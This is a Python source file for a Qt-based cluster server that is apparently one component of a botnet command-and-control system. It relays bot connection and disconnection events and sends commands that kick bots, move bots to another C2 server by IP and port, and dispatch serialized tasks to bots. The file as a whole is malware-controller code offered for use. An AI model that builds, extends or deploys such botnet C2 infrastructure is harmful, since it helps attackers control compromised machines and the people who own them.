from qtpy.QtCore import Signal, Slot
from QtPyNetwork.server import QThreadedServer

from models import Task


class ClusterServer(QThreadedServer):
    """Cluster server."""
    bot_connected = Signal(int, int, int, str)
    bot_disconnected = Signal(int, int)

    def __init__(self):
        super(ClusterServer, self).__init__()

    @Slot(int, dict)
    def on_message(self, device_id: int, message: dict):
        """Receive messages from cluster."""
        event_type = message.get("event_type")
        if event_type == "connection":
            event = message.get("event")
            if event == "connected":
                self.bot_connected.emit(device_id, message.get("bot_id"),
                                        message.get("bot_ip"), message.get("bot_port"))
            elif event == "disconnected":
                self.bot_disconnected.emit(device_id, message.get("bot_id"))

    @Slot(int, int)
    def on_bot_kick(self, device_id: int, bot_id: int):
        """Kick bot from server."""
        self.write(device_id, {"event_type": "connection",
                               "event": "kick",
                               "bot_id": bot_id})

    @Slot(int, int, str, int)
    def on_bot_move(self, device_id: int, bot_id: int, ip: str, port: int):
        """Disconnect bot and connect to another C2 server."""
        self.write(device_id, {"event_type": "connection",
                               "event": "move",
                               "bot_id": bot_id,
                               "ip": ip,
                               "port": port})

    @Slot(int, int, Task)
    def on_bot_task(self, device_id: int, bot_id: int, task: Task):
        """Start task for bot."""
        self.write(device_id, {"event_type": "task",
                               "event": "start",
                               "bot_id": bot_id,
                               "task": task.serialize()})
